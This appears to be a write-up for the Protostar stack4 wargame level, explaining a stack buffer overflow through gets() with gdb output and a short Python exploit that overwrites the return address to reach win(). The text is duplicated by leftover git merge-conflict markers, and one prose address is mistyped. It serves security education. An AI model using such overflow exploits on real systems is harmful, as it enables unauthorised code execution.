# Stack4 Solution

## C Code

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints

* A variety of introductory papers into buffer overflows may help.
* gdb lets you do `run < input`
* EIP is not directly after the end of buffer, compiler padding can also increase the size.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```


## Return Address

Now, we are given the **same task as** [stack3](https://github.com/Naksh-Rathore/protostar-solutions/tree/main/stack3), only with **no function pointer**.
You may be wondering, how do we do this. The way to do it is by using something called a **return address**. A return address is a **value pushed onto the stack** 
that **tells the program where to resume execution** (the next instruction) after a **function call completes**. At the end of a function call, a `ret` **instruction is
always placed at the end**. What the `ret` instruction does is **change EIP to the return address**, then **pop the return address** off of the stack.

## Vulnerability

*Again*, you may be asking how do we use this to go the the `win()` function. The answer lies in **overflowing the stack values by means of** `gets()` (which is vulnerable to buffer overflows) **until we reach the return address, then
changing it**. But one of the hints were that **EIP (Return Address) is not directly after the end of buffer because of padding and compiler optimizations**. 

## Stack Visualization

Here is a **visual** of the stack

```
[ Buffer (64 bytes) ]
[ Saved EBP (4 bytes) ]
[ Return Address (4 bytes) ]
[ Other Stuff ]
```

Remember, the byte amount can **shift** due to compiler optimizations, stack misalignments, and padding.

## Exploit

Ok, so now we have a **rough idea**, let's get our padding sizing and memory addresses.

First, let's throw a **long string** at the binary in GDB.

To do that, **disassemble** `main()` and set a breakpoint at the `ret` instruction.

```bash
user@protostar:/opt/protostar/bin$ gdb stack4
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
End of assembler dump.
(gdb) break *main+22
Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.
(gdb) 
```

Now that we have **our breakpoints set**, let's **run it** and provide `QQQQWWWWEEEERRRRTTTTYYYY....` as input. After that, let's check out all of our registers to see **what letter overwritten EBP**.

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack4 
QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNMMMM

Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x4c4c4c54
) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) info registers
eax            0xbffff760       -1073744032
ecx            0xbffff760       -1073744032
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7ac       0xbffff7ac
ebp            0x4c4c4c4c       0x4c4c4c4c
esi            0x0      0
edi            0x0      0
eip            0x804841e        0x804841e <main+22>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

Now, **we see that EBP was overwritten** to `0x4c4c4c4c`, which is `LLLL` in ASCII. That means to **overwrite the return address**, we need to **first pass** `QQQQWWWWEEEERRRRTTTTYYYY...` until `LLLL`. Then, we can **overwrite the return address with anything we want** by just **appending it to the end** of the string.

```bash
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x5a5a5a5a in ?? ()
(gdb) 
```

Once we continue (`c`), we see that the **return address got overwritten** to `0x5a5a5a5a` (`ZZZZ`) because the **program tried to go to that memory address** which is of course **illegal**. That **checks out** with the EBP overwrite because `ZZZZ` was **right after** `LLLL` in the input string, which **matches up perfectly with our stack visual** from earlier. 

So now we need to get the **memory address** of the `win()` function. Do to that, we use the `p` command in GDB to **print the value of whatever comes after it**.

```bash
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
(gdb) 
```

We see that the **memory address** of `win()` is `0x80483f4`. Now we have *everything* needed to **create our exploit script**.

**TO-DO**

## Resources

* [C Code](https://exploit.education/protostar/stack-four/)
* [Geeks for Geeks Article on Return Addresses](https://www.geeksforgeeks.org/dsa/how-is-return-address-specified-in-stack/)


=======
# Stack4 Solution

## C Code

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints

* A variety of introductory papers into buffer overflows may help.
* gdb lets you do `run < input`
* EIP is not directly after the end of buffer, compiler padding can also increase the size.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```


## Return Address

Now, we are given the **same task as** [stack3](https://github.com/Naksh-Rathore/protostar-solutions/tree/main/stack3), only with **no function pointer**.
You may be wondering, how do we do this. The way to do it is by using something called a **return address**. A return address is a **value pushed onto the stack** 
that **tells the program where to resume execution** (the next instruction) after a **function call completes**. At the end of a function call, a `ret` **instruction is
always placed at the end**. What the `ret` instruction does is **change EIP to the return address**, then **pop the return address** off of the stack.

## Vulnerability

*Again*, you may be asking how do we use this to go the the `win()` function. The answer lies in **overflowing the stack values by means of** `gets()` (which is vulnerable to buffer overflows) **until we reach the return address, then
changing it**. But one of the hints were that **EIP (Return Address) is not directly after the end of buffer because of padding and compiler optimizations**. 

## Stack Visualization

Here is a **visual** of the stack

```
[ Buffer (64 bytes) ]
[ Saved EBP (4 bytes) ]
[ Return Address (4 bytes) ]
[ Other Stuff ]
```

Remember, the byte amount can **shift** due to compiler optimizations, stack misalignments, and padding.

## Exploit

Ok, so now we have a **rough idea**, let's get our padding sizing and memory addresses.

First, let's throw a **long string** at the binary in GDB.

To do that, **disassemble** `main()` and set a breakpoint at the `ret` instruction.

```bash
user@protostar:/opt/protostar/bin$ gdb stack4
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack4...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
End of assembler dump.
(gdb) break *main+22
Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.
(gdb) 
```

Now that we have **our breakpoints set**, let's **run it** and provide `QQQQWWWWEEEERRRRTTTTYYYY....` as input. After that, let's check out all of our registers to see **what letter overwritten EBP**.

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack4 
QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNMMMM

Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x4c4c4c54
) at stack4/stack4.c:16
16      stack4/stack4.c: No such file or directory.
        in stack4/stack4.c
(gdb) info registers
eax            0xbffff760       -1073744032
ecx            0xbffff760       -1073744032
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7ac       0xbffff7ac
ebp            0x4c4c4c4c       0x4c4c4c4c
esi            0x0      0
edi            0x0      0
eip            0x804841e        0x804841e <main+22>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

Now, **we see that EBP was overwritten** to `0x4c4c4c4c`, which is `LLLL` in ASCII. That means to **overwrite the return address**, we need to **first pass** `QQQQWWWWEEEERRRRTTTTYYYY...` until `LLLL`. Then, we can **overwrite the return address with anything we want** by just **appending it to the end** of the string.

```bash
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x5a5a5a5a in ?? ()
(gdb) 
```

Once we continue (`c`), we see that the **return address got overwritten** to `0x5a5a5a5a` (`ZZZZ`) because the **program tried to go to that memory address** which is of course **illegal**. That **checks out** with the EBP overwrite because `ZZZZ` was **right after** `LLLL` in the input string, which **matches up perfectly with our stack visual** from earlier. 

So now we need to get the **memory address** of the `win()` function. Do to that, we use the `p` command in GDB to **print the value of whatever comes after it**.

```bash
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
(gdb) 
```

We see that the **memory address** of `win()` is `0x80483f4`. Now we have *everything* needed to **create our exploit script**.

To **create our exploit script**, we first need to pass `QQQWWWWEEEERRRRTTTTYYYY...` until `LLLL`, then pass `0x80484f4` in **little-edian** to properly **overwrite the return address** and **jump to** the `win()` function to complete the challenge!

Here is the exploit script stored in `/tmp`:

```python
import struct

padding = "QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKK"
ebp = "LLLL"
win_func = struct.pack("I", 0x80483f4)

print(padding + ebp + win_func)
```

Now enter this:

```bash
python /tmp/exploit.py | /opt/protostar/bin/stack4
```

Result:

```bash
code flow successfully changed
Segmentation fault (core dumped)
```

The **segfault** at the end is because we **overwritten the saved EBP** to an invalid address (`0x4c4c4c4c`).

## Resources

* [C Code](https://exploit.education/protostar/stack-four/)
* [Geeks for Geeks Article on Return Addresses](https://www.geeksforgeeks.org/dsa/how-is-return-address-specified-in-stack/)




>>>>>>> d51fa030b682fd964df43c4e39486d9bfaf78bbe:stack4/solution.md
